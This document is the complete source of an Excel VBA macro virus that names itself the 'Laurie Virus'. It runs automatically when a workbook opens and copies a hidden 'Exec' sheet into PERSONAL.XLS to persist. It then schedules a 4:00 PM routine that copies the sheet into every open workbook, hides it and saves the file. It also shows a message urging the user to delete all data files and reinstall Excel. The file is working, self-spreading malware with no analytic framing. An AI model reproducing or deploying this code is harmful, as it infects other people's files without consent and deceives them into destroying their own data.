   Attribute VB_Name = "exec"

   Sub Auto_Open()
   Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
       On Error GoTo FixIt
       Dim SaveBook As String
       SaveBook = ActiveWorkbook.Name
       Application.ScreenUpdating = False
       Windows("PERSONAL.XLS").Visible = True
       If SheetExists("Exec") Then
       Windows("PERSONAL.XLS").Visible = False
       GoTo AlreadyInfected
       Else
       Workbooks(SaveBook).Activate
       Sheets("Exec").Select
       Sheets("Exec").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
       Workbooks("PERSONAL.XLS").Activate
       ActiveWindow.SelectedSheets.Visible = False
       Workbooks("PERSONAL.XLS").Sheets(2).Select
       ActiveWindow.Visible = False
       Workbooks("PERSONAL.XLS").Save
   AlreadyInfected:
       Workbooks(SaveBook).Activate
       If SheetExists("Exec") Then
       End
       End If
       Workbooks("PERSONAL.XLS").Sheets("Exec").Copy Before:=Workbooks(SaveBook).Sheets(1)
       Sheets("Exec").Select
       ActiveWindow.SelectedSheets.Visible = False
       Workbooks(SaveBook).Sheets(2).Select
       End If
       GoTo OhKay
   FixIt:
       Workbooks(SaveBook).Activate
       End
   OhKay:
       Application.OnTime EarliestTime:=TimeValue("4:00 PM"), Procedure:="DipDing"
       MsgBox "You have been infected with the Laurie Virus. Delete all data files and reinstall Excel.", , "Alert"
   End Sub

   Sub DipDing()
   Attribute DipDing.VB_ProcData.VB_Invoke_Func = " \n14"
       Application.ScreenUpdating = False
       Dim book As Workbook
       For Each book In Workbooks
       Windows("PERSONAL.XLS").Visible = True
       Windows("PERSONAL.XLS").Activate
       Sheets("Exec").Visible = True
       Sheets("Exec").Copy Before:=book.Sheets(1)
       Sheets("Exec").Visible = xlVeryHidden
       Windows("PERSONAL.XLS").Visible = False
       book.Save
       Next book
   End Sub

   Function SheetExists(sName As String) As Boolean
   Attribute SheetExists.VB_ProcData.VB_Invoke_Func = " \n14"
       Dim aSheet As Object
       SheetExists = False
       For Each aSheet In ActiveWorkbook.Sheets
           If (StrComp(aSheet.Name, sName, 1) = 0) Then
           SheetExists = True
           End If
       Next aSheet
   End Function
